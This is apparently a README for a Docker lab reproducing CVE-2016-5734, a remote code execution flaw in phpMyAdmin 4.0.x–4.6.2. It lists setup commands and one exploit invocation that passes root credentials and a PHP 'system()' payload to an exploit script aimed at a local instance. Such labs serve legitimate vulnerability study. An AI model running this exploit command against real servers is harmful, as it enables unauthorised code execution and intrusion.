# CVE-2016-5734-docker
PhpMyAdmin 4.0.x—4.6.2 Remote Code Execution Vulnerability (CVE-2016-5734)

## Setup
```
git clone https://github.com/miko550/CVE-2016-5734-docker.git
cd CVE-2016-5734-docker
docker compose up
hhtp://localhost:8083
```
## exploit
```
python3 cve-2016-5734.py -u root --pwd="root" http://localhost:8083 -c "system('ls -lua')"
```

# Reference
https://github.com/vulhub/vulhub/tree/master/phpmyadmin/CVE-2016-5734
https://github.com/allyshka/exploits/tree/master/CVE-2016-5734
